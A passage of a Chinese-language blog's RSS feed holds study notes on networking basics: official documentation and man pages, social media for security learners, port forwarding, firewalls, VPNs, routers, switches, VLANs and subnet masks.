&lt;/h2&gt;&lt;p&gt;需要获得的一项重要技能是查找官方文件。我们将介绍一些官方文档页面的示例。&lt;/p&gt;
&lt;h3 id=&#34;linux-的手册页&#34;&gt;Linux 的手册页
&lt;/h3&gt;&lt;p&gt;早在 Internet 无处不在之前，您如何在 Linux 或类似 Unix 的系统中使用命令获得帮助？答案是检查手册页，简称手册页。在 Linux 和每个类 Unix 系统上，每个命令都应该有一个手册页。事实上，还存在用于系统调用、库函数甚至配置文件的手册页。&lt;/p&gt;
&lt;p&gt;假设我们想检查命令 &lt;code&gt;ip&lt;/code&gt; 的手册页。我们发出命令 &lt;code&gt;man ip&lt;/code&gt;。下面的屏幕截图显示了我们收到的页面。您可能希望启动 AttackBox 并在终端上运行 &lt;code&gt;man ip&lt;/code&gt;。按 &lt;code&gt;q&lt;/code&gt; 退出。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324130417671.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324130417671&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;如果您更喜欢在 Web 浏览器中阅读 &lt;code&gt;ip&lt;/code&gt; 的手册页，只需在您最喜欢的搜索引擎中输入 &lt;code&gt;man ip&lt;/code&gt; 即可。&lt;a class=&#34;link&#34; href=&#34;https://linux.die.net/man/8/ip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 此页面&lt;/a&gt;可能位于结果的顶部。&lt;/p&gt;
&lt;h3 id=&#34;microsoft-windows&#34;&gt;Microsoft Windows
&lt;/h3&gt;&lt;p&gt;Microsoft 为其产品提供了官方&lt;a class=&#34;link&#34; href=&#34;https://learn.microsoft.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;技术文档&lt;/a&gt;页面。下面的屏幕截图显示了命令 &lt;code&gt;ipconfig&lt;/code&gt; 的搜索结果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324130457281.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324130457281&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;产品文档&#34;&gt;产品文档
&lt;/h3&gt;&lt;p&gt;每个流行的产品都应该有组织良好的文档。本文档提供了有关产品特性和功能的官方可靠信息来源。示例包括 &lt;a class=&#34;link&#34; href=&#34;https://www.snort.org/documents&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Snort 官方文档 &lt;/a&gt;、&lt;a class=&#34;link&#34; href=&#34;https://httpd.apache.org/docs/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Apache HTTP 服务器文档 &lt;/a&gt;、&lt;a class=&#34;link&#34; href=&#34;https://www.php.net/manual/en/index.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PHP 文档&lt;/a&gt;和 &lt;a class=&#34;link&#34; href=&#34;https://nodejs.org/docs/latest/api/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Node.js 文档 &lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;查看官方文档总是有益的，因为它是最新的并提供最完整的产品信息。&lt;/p&gt;
&lt;h2 id=&#34;社交媒体&#34;&gt;社交媒体
&lt;/h2&gt;&lt;p&gt;有数十亿用户在 &lt;a class=&#34;link&#34; href=&#34;https://www.facebook.com/people/Tryhackme/100069557747714/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Facebook&lt;/a&gt;、&lt;a class=&#34;link&#34; href=&#34;https://twitter.com/RealTryHackMe&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Twitter&lt;/a&gt; 和 &lt;a class=&#34;link&#34; href=&#34;https://www.linkedin.com/company/tryhackme/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;LinkedIn&lt;/a&gt; 等社交媒体平台上注册。我们希望您熟悉流行的平台。但是，如果您知道任何不熟悉的平台，我们建议您查看并了解它。理想情况下，人们希望在不创建帐户的情况下探索平台;但是，这会严重限制您的体验。相反，一个建议是使用临时电子邮件地址来发现这些平台，而无需将它们链接到您的真实电子邮件地址;完成后，您可以终止账户和关联的电子邮件地址。不使用您的主要帐户的一个原因是，当您只是暂时探索平台时，您不希望您的联系人开始在那里与您联系。&lt;/p&gt;
&lt;p&gt;社交媒体的力量在于它可以让您与您感兴趣的公司和人建立联系。此外，社交媒体为网络安全专业人士提供了丰富的信息，无论他们是搜索人员还是技术信息。你会问为什么搜索人很重要？&lt;/p&gt;
&lt;p&gt;在保护公司时，您应该确保您保护的人不会在社交媒体上过度分享。例如，他们的社交媒体可能会泄露他们秘密问题的答案，例如，“你小时候上过哪所学校？此类信息可能允许攻击者重置其密码并轻松接管其帐户。&lt;/p&gt;
&lt;p&gt;此外，作为网络安全专业人士，您希望随时了解新的网络安全趋势、技术和产品。遵循适当的渠道和小组可以为增长您的技术专业知识提供合适的环境。&lt;/p&gt;
&lt;p&gt;除了通过社交媒体渠道和群组保持更新外，我们还应该提及新闻媒体。数百个新闻网站将提供有价值的网络安全相关新闻。尝试不同的，并坚持你最喜欢的。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>网络扩展</title>
        <link>https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E6%89%A9%E5%B1%95/</link>
        <pubDate>Mon, 24 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E6%89%A9%E5%B1%95/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/waves-8905720.png" alt="Featured image of post 网络扩展" /&gt;&lt;h1 id=&#34;网络扩展&#34;&gt;网络扩展
&lt;/h1&gt;&lt;h2 id=&#34;端口转发&#34;&gt;端口转发
&lt;/h2&gt;&lt;p&gt;端口转发是将应用程序和服务连接到 Internet 的重要组件。如果没有端口转发，应用程序和服务（如 Web 服务器）只能用于同一直接网络内的设备。&lt;/p&gt;
&lt;p&gt;以下面的网络为例。在此网络中，IP 地址为“192.168.1.10”的服务器在端口 80 上运行 Web 服务器。只有此网络上的其他两台计算机能够访问它（这称为 Intranet）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324094651577.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324094651577&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;如果管理员希望公众可以访问网站（使用 Internet），则必须实施端口转发，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324094705660.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324094705660&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;通过这种设计，网络 #2 现在将能够使用网络 #1 的公共 IP 地址 （82.62.51.70） 访问在网络 #1 上运行的 Web 服务器。&lt;/p&gt;
&lt;p&gt;很容易将端口转发与防火墙的行为混淆（我们将在后面的任务中讨论这项技术）。但是，在这个阶段，只需了解端口转发会打开特定端口（回想一下数据包的工作原理）。相比之下，防火墙确定流量是否可以通过这些端口传输（即使这些端口通过端口转发打开）。&lt;/p&gt;
&lt;p&gt;端口转发在网络的路由器上配置。&lt;/p&gt;
&lt;h2 id=&#34;防火墙基础&#34;&gt;防火墙基础
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324094753176.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324094753176&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;防火墙是网络中负责确定允许哪些流量进出的设备。将防火墙视为网络的边界安全。管理员可以根据多种因素配置防火墙以允许 或 &lt;strong&gt;拒绝&lt;/strong&gt; 流量进入或退出网络，例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;流量来自哪里？（是否告知防火墙接受/拒绝来自特定网络的流量？）&lt;/li&gt;
&lt;li&gt;流量去哪里了？（是否告知防火墙接受/拒绝发往特定网络的流量？）&lt;/li&gt;
&lt;li&gt;流量用于哪个端口？（是否已告知防火墙仅接受/拒绝发往端口 80 的流量？）&lt;/li&gt;
&lt;li&gt;流量使用什么协议？（是否告知防火墙接受/拒绝 UDP、TCP 或两者兼而有之的流量？）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;防火墙执行数据包检查以确定这些问题的答案。&lt;/p&gt;
&lt;p&gt;防火墙有各种形状和大小。从可以处理大量数据的专用硬件（通常位于企业等大型网络中）到住宅路由器（如您家中）或 &lt;a class=&#34;link&#34; href=&#34;https://www.snort.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Snort&lt;/a&gt; 等软件，防火墙可分为 2 到 5 类。&lt;/p&gt;
&lt;p&gt;我们将在下表中介绍防火墙的两大主要类别：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;防火墙类别&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;描述&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Stateful 状态&lt;/td&gt;
          &lt;td&gt;这种类型的防火墙使用来自连接的全部信息;此防火墙不是检查单个数据包，而是&lt;strong&gt;根据整个连接&lt;/strong&gt;确定设备的行为。与无状态防火墙相比，这种防火墙类型会消耗许多资源，因为决策是动态的。例如， 防火墙可能允许 TCP 握手的第一部分，但稍后会失败。如果来自主机的连接错误，它将阻止整个设备。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Stateless 无状态&lt;/td&gt;
          &lt;td&gt;此防火墙类型使用一组静态规则来确定&lt;strong&gt;单个数据包&lt;/strong&gt;是否可接受。例如，发送错误数据包的设备并不一定意味着整个设备随后被阻止。虽然这些防火墙使用的资源比其他防火墙少得多，但它们要笨得多。例如，这些防火墙仅对其中定义的规则有效。如果规则不完全匹配，它实际上就毫无用处。 但是，当从一组主机接收大量流量（例如分布式拒绝服务攻击）时，这些防火墙非常有用&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;防火墙练习&#34;&gt;防火墙练习
&lt;/h2&gt;&lt;p&gt;恶意流量被标记为红色数据包。合法流量是标记为绿色的数据包。您需要阻止的协议是端口 80。 &lt;strong&gt;配置防火墙 ，防止恶意数据包到达 Web 服务器 203.0.110.1&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324095213484.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324095213484&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324095314842.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324095314842&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;vpn基础知识&#34;&gt;VPN基础知识
&lt;/h2&gt;&lt;p&gt;A &lt;strong&gt;V&lt;/strong&gt;irtual &lt;strong&gt;P&lt;/strong&gt;rivate &lt;strong&gt;N&lt;/strong&gt;etwork（或 简称 &lt;strong&gt;VPN&lt;/strong&gt; ）是一种技术，它允许不同网络上的设备通过通过 Internet 在彼此之间创建专用路径（称为隧道）来安全地通信。在此隧道中连接的设备将形成自己的专用网络。&lt;/p&gt;
&lt;p&gt;例如，只有同一网络（例如企业内部）内的设备才能直接通信。但是，VPN 允许连接两个办公室。让我们看下图，其中有三个网络：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324101129516.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324101129516&#34;
	
	
&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Network #1 (Office #1)&lt;/li&gt;
&lt;li&gt;Network #2 (Office #2)&lt;/li&gt;
&lt;li&gt;Network #3 （通过 VPN 连接的两台设备）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;连接在网络 #3 上的设备仍然是网络 #1 和网络 #2 的一部分，但也共同形成一个专用网络（网络 #3），只有通过此 VPN 连接的设备才能通过该网络进行通信。&lt;/p&gt;
&lt;p&gt;让我们在下表中介绍 VPN 提供的其他一些好处：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;效益&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;描述&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;允许连接不同地理位置的网络。&lt;/td&gt;
          &lt;td&gt;例如，拥有多个办事处的企业会发现 VPN 是有益的，因为这意味着可以从另一个办公室访问服务器/基础设施等资源。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;提供隐私。&lt;/td&gt;
          &lt;td&gt;VPN 技术使用加密来保护数据。这意味着它只能在发送它的设备和目的地之间被理解，这意味着数据不易被嗅探。这种加密在网络不提供加密的公共 WiFi 的地方很有用。您可以使用 VPN 来保护您的流量不被其他人查看。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;提供匿名&lt;/td&gt;
          &lt;td&gt;记者和活动家依靠 VPN 在言论自由受到控制的国家/地区安全地报道全球问题。通常，您的 ISP 和其他中介可以查看您的流量，因此可以对其进行跟踪。VPN 提供的匿名性级别仅与网络上其他设备尊重隐私的方式一样多。例如，在这方面，记录您所有数据/历史记录的 VPN 与不使用 VPN 本质上相同。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;TryHackMe 使用 VPN 将您连接到我们易受攻击的机器，而无需在 Internet 上直接访问它们！这意味着：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;您可以安全地与我们的机器交互&lt;/li&gt;
&lt;li&gt;服务提供商（如 ISP）不会认为您正在攻击 Internet 上的另一台计算机（这可能违反服务条款）&lt;/li&gt;
&lt;li&gt;VPN 为 TryHackMe 提供安全性，因为无法使用 Internet 访问易受攻击的机器。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;VPN 技术多年来一直在改进。让我们在下面探索一些现有的 VPN 技术：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;**VPN Technology **&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;描述&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;PPP&lt;/td&gt;
          &lt;td&gt;PPTP 使用此技术（如下所述）来允许身份验证并提供数据加密。VPN 通过使用私钥和公有证书（类似于 &lt;strong&gt;SSH&lt;/strong&gt;）来工作。私钥和证书必须匹配才能连接。该技术无法自行离开网络（不可路由）。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;PPTP&lt;/td&gt;
          &lt;td&gt;（&lt;strong&gt;PPTP&lt;/strong&gt;） 是允许来自 PPP 的数据传输和离开网络的技术。PPTP 非常易于设置，并且大多数设备都支持。但是，与其他选择相比，它的加密较弱。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;IPSec&lt;/td&gt;
          &lt;td&gt;协议安全 （IPsec） 使用现有的 &lt;strong&gt;I&lt;/strong&gt;nternet &lt;strong&gt;P&lt;/strong&gt;rotocol （&lt;strong&gt;IP&lt;/strong&gt;） 框架对数据进行加密。与其他选择相比，IPSec 很难设置;但是，如果成功，它拥有强大的加密功能，并且许多设备也支持它。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;lan-联网设备&#34;&gt;LAN 联网设备
&lt;/h2&gt;&lt;h3 id=&#34;什么是路由器&#34;&gt;什么是路由器
&lt;/h3&gt;&lt;p&gt;路由器的工作是连接网络并在它们之间传递数据。它通过使用路由来实现这一点（因此得名 router）&lt;/p&gt;
&lt;p&gt;路由是给跨网络传输数据的过程的标签。路由涉及在网络之间创建路径，以便成功传送此数据。路由器在 OSI 模型的第 3 层运行。它们通常具有交互式界面（例如网站或控制台），允许管理员配置各种规则，例如端口转发或防火墙。&lt;/p&gt;
&lt;p&gt;当设备通过许多路径连接时，路由非常有用，例如在下面的示例图中，其中采用最佳路径：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324101806782.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324101806782&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;路由器是专用设备，不执行与交换机相同的功能。&lt;/p&gt;
&lt;p&gt;我们可以看到，计算机 A 的网络通过中间的两个路由器连接到计算机 B 的网络。问题是：将采取什么道路？不同的协议将决定应该采取什么路径，但因素包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;最短的路径是什么？&lt;/li&gt;
&lt;li&gt;什么路径最可靠？&lt;/li&gt;
&lt;li&gt;哪条路径具有更快的介质（例如铜缆或光纤）？&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;什么是交换机&#34;&gt;什么是交换机
&lt;/h3&gt;&lt;p&gt;交换机是一种专用网络设备，负责提供连接到多个设备的方法。交换机可以使用以太网电缆为许多设备（从 3 到 63 个）提供服务。&lt;/p&gt;
&lt;p&gt;交换机可以在 OSI 模型的第 2 层和第 3 层运行。但是，这些是排他性的，因为第 2 层交换机不能在第 3 层运行。&lt;/p&gt;
&lt;p&gt;以下图中的第 2 层交换机为例。这些交换机将使用帧的 MAC 地址将帧（请记住，这些不再是数据包，因为 IP 协议已被剥离）转发到连接的设备上。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324111004136.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324111004136&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这些交换机仅负责将帧发送到正确的设备。&lt;/p&gt;
&lt;p&gt;现在，让我们来看看第 3 层交换机。这些交换机比第 2 层更复杂，因为它们可以执行  路由器的一些职责。也就是说，这些交换机将帧发送到设备（就像第 2 层一样），并使用 IP 协议将数据包路由到其他设备。&lt;/p&gt;
&lt;p&gt;让我们看一下下图中的第 3 层交换机。我们可以看到有两个 IP 地址：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;192.168.1.1&lt;/li&gt;
&lt;li&gt;192.168.2.1&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一种称为 &lt;strong&gt;VLAN&lt;/strong&gt; （&lt;strong&gt;V&lt;/strong&gt;irtual &lt;strong&gt;L&lt;/strong&gt;ocal &lt;strong&gt;A&lt;/strong&gt;rea &lt;strong&gt;N&lt;/strong&gt;etwork） 的技术允许对网络内的特定设备进行虚拟拆分。这种拆分意味着他们都可以从 Internet 连接等中受益，但被单独处理。这种网络分离提供了安全性，因为这意味着现有的规则决定了特定设备如何相互通信。这种分离如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324111028507.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324111028507&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;在上图的上下文中，“销售部门”和“会计部门”将能够访问 Internet，但无法相互通信（尽管它们连接到同一交换机）。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>子网与子网掩码</title>
        <link>https://Yerucrem.github.io/p/%E5%AD%90%E7%BD%91%E4%B8%8E%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81/</link>
        <pubDate>Mon, 24 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E5%AD%90%E7%BD%91%E4%B8%8E%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/pattern-8801850.png" alt="Featured image of post 子网与子网掩码" /&gt;&lt;h1 id=&#34;子网与子网掩码&#34;&gt;子网与子网掩码
&lt;/h1&gt;&lt;p&gt;子网和子网掩码是网络中的核心概念，用来&lt;strong&gt;划分和管理 IP 地址&lt;/strong&gt;。我们可以通过一个生活化的例子来理解它们：&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;-类比城市街道和门牌号&#34;&gt;&lt;strong&gt;🌍 类比：城市、街道和门牌号&lt;/strong&gt;
&lt;/h2&gt;&lt;p&gt;假设整个城市是一个大网络（比如 &lt;code&gt;192.168.1.0/24&lt;/code&gt;），所有房子（设备）的地址都类似 &lt;code&gt;192.168.1.X&lt;/code&gt;。但随着城市扩张，直接管理所有地址变得困难。于是，市长（网络管理员）决定将城市划分为几个区（子网），每个区有独立的街道和门牌号。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;子网（Subnet）&lt;/strong&gt;：
就像把城市划分为多个区（例如“东区”、“西区”），每个区内的地址范围更小、更易管理。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原城市地址：&lt;code&gt;192.168.1.0&lt;/code&gt; ~ &lt;code&gt;192.168.1.255&lt;/code&gt;（共 256 个地址）&lt;/li&gt;
&lt;li&gt;划分为两个子网：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;东区&lt;/strong&gt;：&lt;code&gt;192.168.1.0&lt;/code&gt; ~ &lt;code&gt;192.168.1.127&lt;/code&gt;（128 个地址）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;西区&lt;/strong&gt;：&lt;code&gt;192.168.1.128&lt;/code&gt; ~ &lt;code&gt;192.168.1.255&lt;/code&gt;（128 个地址）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;子网掩码（Subnet Mask）&lt;/strong&gt;：
像是一把标尺，用来区分“区号”和“门牌号”。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;原城市的子网掩码：&lt;code&gt;255.255.255.0&lt;/code&gt;（二进制：&lt;code&gt;11111111.11111111.11111111.00000000&lt;/code&gt;）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;划分子网后的子网掩码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;255.255.255.128
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;（二进制：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;11111111.11111111.11111111.10000000
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;前 25 位&lt;/strong&gt;表示“区号”（如东区或西区），&lt;strong&gt;后 7 位&lt;/strong&gt;表示区内的“门牌号”。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;-技术解释&#34;&gt;&lt;strong&gt;🔍 技术解释&lt;/strong&gt;
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;子网（Subnet）&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将一个大网络（如 &lt;code&gt;192.168.1.0/24&lt;/code&gt;）分割成多个小网络，便于管理、优化流量、提高安全性。&lt;/li&gt;
&lt;li&gt;每个子网有自己的地址范围，例如：
&lt;ul&gt;
&lt;li&gt;子网1：&lt;code&gt;192.168.1.0/25&lt;/code&gt;（地址范围：&lt;code&gt;0&lt;/code&gt; ~ &lt;code&gt;127&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;子网2：&lt;code&gt;192.168.1.128/25&lt;/code&gt;（地址范围：&lt;code&gt;128&lt;/code&gt; ~ &lt;code&gt;255&lt;/code&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;子网掩码（Subnet Mask）&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;一个 32 位的二进制数字，与 IP 地址配合使用，用于标识&lt;strong&gt;网络部分&lt;/strong&gt;和&lt;strong&gt;主机部分&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt; 规则

 ：

 - `1` 的位表示网络地址（不可变），`0` 的位表示主机地址（可变）。

 - 例如，

   ```
   255.255.255.0
   ```

   （二进制

    

   ```
   11111111.11111111.11111111.00000000
   ```

   ）表示：

   - 前 24 位是网络地址，后 8 位是主机地址（可容纳 `2^8 - 2 = 254` 台设备，减去的 2 是网络地址和广播地址）。
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h2 id=&#34;-实际例子&#34;&gt;&lt;strong&gt;🌰 实际例子&lt;/strong&gt;
&lt;/h2&gt;&lt;p&gt;假设公司有一个局域网 &lt;code&gt;192.168.1.0/24&lt;/code&gt;，需要为三个部门（财务部、技术部、市场部）划分子网：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;划分子网&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;使用子网掩码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;255.255.255.192
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;（二进制&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;11111111.11111111.11111111.11000000
